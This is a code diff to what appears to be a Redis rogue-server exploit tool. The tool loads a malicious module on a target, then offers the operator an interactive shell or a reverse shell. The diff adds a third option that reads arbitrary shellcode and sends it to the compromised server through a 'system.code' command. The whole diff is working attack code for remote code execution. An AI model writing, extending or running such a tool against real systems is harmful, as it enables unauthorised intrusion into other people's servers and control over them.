@@ -153,6 +153,11 @@ def reverse(remote):
     info("Reverse shell payload sent.")
     info(f"Check at {addr}:{port}")
 
+def native_code(remote):
+    code = input("shellcode: ")
+    dout(remote, encode_cmd(f"system.code {code}"))
+    info("shellcode sent.")
+
 def cleanup(remote):
     info("Unload module...")
     remote.do("MODULE UNLOAD system")
@@ -177,11 +182,13 @@ def runserver(rhost, rport, lhost, lport):
     rogue.close()
 
     # Operations here
-    choice = input("What do u want, [i]nteractive shell or [r]everse shell: ")
+    choice = input("What do u want, [i]nteractive shell or [r]everse shell or [s]hellcode: ")
     if choice.startswith("i"):
         interact(remote)
     elif choice.startswith("r"):
         reverse(remote)
+    elif choice.startswith("s"):
+        native_code(remote)
 
     cleanup(remote)
 
